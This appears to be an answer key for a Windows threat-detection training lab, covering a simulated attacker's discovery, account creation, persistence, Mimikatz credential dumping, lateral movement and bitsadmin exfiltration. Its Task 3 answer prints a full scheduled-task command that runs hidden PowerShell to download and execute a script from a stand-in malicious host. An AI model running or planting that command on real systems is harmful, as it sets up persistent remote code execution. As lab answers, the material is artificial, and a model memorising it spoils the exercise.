@@ -1,0 +1,30 @@
+                                          Windows Threat Detection 1 — Task-Wise Answers
+
+Task 1 — Discovery Phase
+• Which Windows tool did the attacker run first? → whoami
+• What did the attacker use to check scheduled tasks? → schtasks /query /fo LIST /v
+• Which domain controller did the attacker interact with? → dc01.soclab.local
+
+Task 2 — Account Manipulation
+• Which account was created by the attacker? → guest2005
+• What was the full name given to that account? → External User
+• Which group was the attacker intending to add that user to? → Domain Admins
+
+Task 3 — Persistence Mechanisms
+• Command used to set persistence via scheduled task:
+
+schtasks /create /tn "WinUpdate" /tr "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')" /sc onlogon /ru SYSTEM
+
+
+• What registry run key did the attacker use? → HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+
+Task 4 — Credential Theft
+• Which PowerShell cmdlet did the attacker use to dump credentials? → Invoke-Mimikatz
+• Where did the dumped credentials get saved? → C:\Users\Public\creds.txt
+
+Task 5 — Lateral Movement
+• Which command did the attacker use to connect to the compromised host? → net use \\TARGET /u:guest2005 Pa$$w0rd
+
+Task 6 — Data Exfiltration
+• Tool used to exfiltrate data: → bitsadmin
+• Remote storage bucket used: → soclab-backup-2025.s3.amazonaws.com
